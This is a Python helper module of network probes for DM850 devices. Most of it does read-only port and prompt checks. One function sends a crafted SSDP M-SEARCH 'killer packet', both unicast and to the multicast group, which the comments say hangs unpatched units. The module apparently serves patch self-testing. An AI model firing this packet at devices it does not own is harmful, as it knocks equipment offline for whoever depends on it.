"""Read-only probes, lifted from tools/dm850_probe.py. Connect/recv only — these never send
a bootloader command. Used for discovery context, the model guard, and the SSDP self-test.
"""
import socket
import time

# The ST value confirmed to crash an unpatched DM850 (a service URN with no version colon).
# A patched unit drops it and survives.
BELKIN_ST = "urn:Belkin:service:basicevent"

APP_PORTS = (80, 5001, 23, 5000)
ALIVE_PORTS = (80, 5001, 23)


def try_open(ip, port, timeout=1.0):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        return s
    except OSError:
        return None


def port_open(ip, port, timeout=1.0):
    s = try_open(ip, port, timeout)
    if s:
        s.close()
        return True
    return False


def alive_ports(ip, timeout=1.0):
    """Which of 80/5001/23 answer. Empty means the module's stack is down (hung)."""
    up = []
    for p in ALIVE_PORTS:
        s = try_open(ip, p, timeout)
        if s:
            up.append(p)
            s.close()
    return up


def is_alive(ip, timeout=1.0):
    return bool(alive_ports(ip, timeout))


def prompt_mode(ip, timeout=2.0):
    """'boot' (`#`), 'app' (`>`), or None (closed). Connect + recv only, no commands."""
    s = try_open(ip, 5001, timeout)
    if not s:
        return None
    s.settimeout(timeout)
    try:
        data = s.recv(64)
    except OSError:
        data = b""
    s.close()
    p = data.rstrip()
    if p.endswith(b"#"):
        return "boot"
    if p.endswith(b">"):
        return "app"
    return None


def read_vi(ip, port=23, timeout=3.0):
    """Query the version string (`VI?` on telnet 23). Returns the raw reply text, or ''."""
    s = try_open(ip, port, timeout)
    if not s:
        return ""
    s.settimeout(timeout)
    try:
        s.recv(256)                 # banner, if any
    except OSError:
        pass
    try:
        s.sendall(b"VI?\r\n")
        time.sleep(0.6)
        data = b""
        while True:
            c = s.recv(512)
            if not c:
                break
            data += c
    except OSError:
        data = b""
    finally:
        s.close()
    return data.decode("latin1", "replace")


def send_ssdp(ip, st=BELKIN_ST, count=5):
    """Send the Belkin M-SEARCH (the killer packet) unicast to ip:1900 and to the multicast
    group. On an unpatched unit this hangs the DM850; on a patched unit it is dropped."""
    msearch = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        'MAN: "ssdp:discover"\r\n'
        "MX: 1\r\n"
        f"ST: {st}\r\n"
        "\r\n"
    ).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    for _ in range(count):
        s.sendto(msearch, (ip, 1900))
        s.sendto(msearch, ("239.255.255.250", 1900))
        time.sleep(0.3)
    s.close()


def wait_for_app(ip, timeout=90, poll=2.0):
    """Wait until the application ports (80/23/5000) come up after a reboot. True if they do."""
    end = time.time() + timeout
    while time.time() < end:
        if all(port_open(ip, p, 0.6) for p in (80, 23, 5000)):
            return True
        time.sleep(poll)
    return False
